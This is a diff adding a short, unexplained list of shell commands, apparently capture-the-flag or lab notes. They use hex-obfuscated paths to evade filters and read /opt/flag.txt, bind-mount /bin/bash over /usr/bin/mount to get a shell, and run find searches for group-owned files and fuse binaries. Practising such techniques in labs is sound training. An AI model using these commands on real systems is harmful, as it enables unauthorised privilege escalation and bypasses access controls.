@@ -1,0 +1,9 @@
+echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
+
+cat $(echo -e "\x2fopt\x2fflag.txt")
+
+/usr/bin/mount -o bind /bin/bash /usr/bin/mount
+
+find / -type f -group user 2>/dev/null
+
+find / -type f -iname fuse 2>/dev/null
